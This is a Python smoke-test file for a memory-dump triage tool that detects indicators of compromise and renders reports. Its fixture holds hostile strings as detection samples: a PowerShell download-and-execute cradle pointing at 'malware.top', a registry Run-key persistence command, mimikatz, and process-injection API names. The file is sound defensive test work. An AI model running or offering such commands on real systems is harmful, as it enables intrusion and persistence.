"""Smoke tests for MEMTRIAGE — no network, pure stdlib."""
import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from memtriage import core
from memtriage.cli import main

SAMPLE = (
    b"powershell.exe -enc SQBFAFgA\n"
    b"mimikatz.exe\n"
    b"IEX (New-Object Net.WebClient).DownloadString('http://malware.top/a.ps1')\n"
    b"connect 185.220.101.47:443 and internal 192.168.68.10\n"
    b"reg add HKCU\\...\\CurrentVersion\\Run /v X /d evil.exe\n"
    b"wallet bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\n"
    b"VirtualAlloc WriteProcessMemory CreateRemoteThread\n"
    b"contact operator@evil-domain.ru\n"
    b"C:\\Users\\Public\\Temp\\drop.exe\n"
)


class TestCore(unittest.TestCase):
    def test_extract_strings(self):
        strings = core.extract_strings(b"\x00\x01hello world\x00\xff__bad")
        self.assertIn("hello world", strings)
        self.assertTrue(all(len(s) >= 4 for s in strings))

    def test_analyze_finds_indicators(self):
        rep = core.analyze(SAMPLE, source="sample")
        cats = {f.category for f in rep.findings}
        for expect in ("process", "behavior", "ipv4", "crypto",
                       "persistence", "url", "email", "path"):
            self.assertIn(expect, cats, f"missing category {expect}")

    def test_severity_escalates_to_critical(self):
        rep = core.analyze(SAMPLE, source="sample")
        self.assertEqual(rep.max_severity, "critical")  # mimikatz / injection

    def test_internal_ip_downgraded(self):
        rep = core.analyze(b"host 192.168.68.10 and host 8.8.8.8", source="x")
        sev = {f.value: f.severity for f in rep.findings if f.category == "ipv4"}
        self.assertEqual(sev.get("192.168.68.10"), "low")
        self.assertEqual(sev.get("8.8.8.8"), "medium")

    def test_clean_input_no_findings(self):
        rep = core.analyze(b"just some boring plain english text here", source="c")
        self.assertEqual(rep.findings, [])
        self.assertEqual(rep.max_severity, "info")

    def test_json_renderer_roundtrips(self):
        rep = core.analyze(SAMPLE, source="sample")
        data = json.loads(core.render_json(rep))
        self.assertEqual(data["tool"], core.TOOL_NAME)
        self.assertIn("severity_counts", data)
        self.assertEqual(len(data["findings"]), len(rep.findings))

    def test_html_renderer_self_contained(self):
        rep = core.analyze(SAMPLE, source="sample")
        out = core.render_html(rep)
        self.assertTrue(out.lstrip().startswith("<!doctype html>"))
        self.assertIn("<style>", out)
        self.assertIn("MEMTRIAGE", out)

    def test_table_renderer(self):
        rep = core.analyze(SAMPLE, source="sample")
        out = core.render_table(rep)
        self.assertIn("memory triage report", out)
        self.assertIn("CRITICAL", out.upper())


class TestCLI(unittest.TestCase):
    def setUp(self):
        self.dump = os.path.join(os.path.dirname(__file__), "_tmp_dump.bin")
        with open(self.dump, "wb") as fh:
            fh.write(SAMPLE)

    def tearDown(self):
        for p in (self.dump, self.dump + ".html"):
            if os.path.exists(p):
                os.remove(p)

    def test_version(self):
        with self.assertRaises(SystemExit) as cm:
            main(["--version"])
        self.assertEqual(cm.exception.code, 0)

    def test_no_command_returns_3(self):
        self.assertEqual(main([]), 3)

    def test_triage_findings_exit_2(self):
        self.assertEqual(main(["triage", self.dump, "--format", "json"]), 2)

    def test_triage_fail_on_critical_only(self):
        self.assertEqual(main(["triage", self.dump, "--fail-on", "critical"]), 2)

    def test_clean_exit_0(self):
        clean = self.dump + ".clean"
        with open(clean, "wb") as fh:
            fh.write(b"nothing interesting in this buffer at all friend")
        try:
            self.assertEqual(main(["triage", clean]), 0)
        finally:
            os.remove(clean)

    def test_html_output_file(self):
        out = self.dump + ".html"
        rc = main(["triage", self.dump, "--format", "html", "-o", out])
        self.assertEqual(rc, 2)
        with open(out, encoding="utf-8") as fh:
            self.assertIn("<!doctype html>", fh.read())

    def test_missing_file_exit_3(self):
        self.assertEqual(main(["triage", "no_such_file_zzz.bin"]), 3)


if __name__ == "__main__":
    unittest.main()
